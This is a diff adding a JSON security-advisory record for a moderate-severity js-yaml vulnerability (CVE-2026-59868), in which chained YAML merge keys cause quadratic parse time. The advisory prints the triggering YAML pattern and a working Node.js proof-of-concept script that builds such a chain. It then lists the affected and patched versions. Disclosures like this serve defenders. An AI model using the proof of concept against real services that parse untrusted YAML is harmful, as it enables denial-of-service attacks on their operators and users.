@@ -1,0 +1,59 @@
+{
+  "Severity": "MODERATE",
+  "UpdatedAt": "2026-07-20T21:19:29Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "js-yaml"
+  },
+  "Advisory": {
+    "DatabaseId": 377855,
+    "Id": "GSA_kwCzR0hTQS1nNzk2LWZnbWctOTNtds4ABcP_",
+    "GhsaId": "GHSA-g796-fgmg-93mv",
+    "References": [
+      {
+        "Url": "https://github.com/nodeca/js-yaml/security/advisories/GHSA-g796-fgmg-93mv"
+      },
+      {
+        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2026-59868"
+      },
+      {
+        "Url": "https://github.com/nodeca/js-yaml/commit/3105455b81dee69e0fd36e09ac0b2ccfdb54adc1"
+      },
+      {
+        "Url": "https://github.com/nodeca/js-yaml/releases/tag/5.2.0"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-g796-fgmg-93mv"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-g796-fgmg-93mv"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-59868"
+      }
+    ],
+    "Description": "### Impact\n\nThis is the same report as for v3/v4, but with lower severity, because in v5, merge is off by default\n\nWhen merge keys (`\u003c\u003c`) are enabled, js-yaml can spend quadratic CPU time parsing a document whose size grows only linearly. The issue is triggered by a chain of mappings where each mapping merges the previous one:\n\n```yaml\na0: \u0026a0 { k0: 0 }\na1: \u0026a1 { \u003c\u003c: *a0, k1: 1 }\na2: \u0026a2 { \u003c\u003c: *a1, k2: 2 }\na3: \u0026a3 { \u003c\u003c: *a2, k3: 3 }\n...\nb: *aN\n```\n\nFor each new mapping, the loader has to enumerate the keys inherited from the previous mapping. With N chained mappings, this results in roughly 1 + 2 + ... + N merged-key visits, i.e., O(N^2) work for O(N) input size.\n\n### PoC\n\nFrom N = 4000 delay become \u003e 1s (doc size \u003c 100K)\n\n```js\nimport { performance } from 'node:perf_hooks'\nimport { Buffer } from 'node:buffer'\nimport { load, YAML11_SCHEMA } from 'js-yaml'\n\nconst n = Number(process.argv[2] || 4000)\n\nfunction makeMergeChain (count) {\n  const lines = ['a0: \u0026a0 { k0: 0 }']\n\n  for (let i = 1; i \u003c count; i++) {\n    lines.push(`a${i}: \u0026a${i} { \u003c\u003c: *a${i - 1}, k${i}: ${i} }`)\n  }\n\n  lines.push(`b: *a${count - 1}`)\n  return `${lines.join('\\n')}\\n`\n}\n\nconst source = makeMergeChain(n)\n\nconsole.log(source.split('\\n').slice(0, 8).join('\\n'))\nconsole.log('...')\nconsole.log(source.split('\\n').slice(-4).join('\\n'))\nconsole.log()\nconsole.log(`N: ${n}`)\nconsole.log(`YAML size: ${Buffer.byteLength(source)} bytes`)\n\nconst started = performance.now()\nconst result = load(source, { schema: YAML11_SCHEMA })\nconst elapsed = performance.now() - started\n\nconsole.log(`parse time: ${elapsed.toFixed(1)} ms`)\nconsole.log(`top-level keys: ${Object.keys(result).length}`)\nconsole.log(`b keys: ${Object.keys(result.b).length}`)\n```\n\n### Patches\n\nFix released. The most robust protection is to limit the total number of merged keys per parse call. This should close all past and future edge cases with merge. The default 10K-key limit should be okay in most cases.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-07-20T21:19:27Z",
+    "Severity": "MODERATE",
+    "Summary": "js-yaml: YAML merge-key chains can force quadratic CPU consumption in js-yaml",
+    "UpdatedAt": "2026-07-20T21:19:29Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 5.3,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "5.2.0"
+      },
+      "VulnerableVersionRange": "\u003e= 5.0.0, \u003c= 5.1.0"
+    }
+  ]
+}
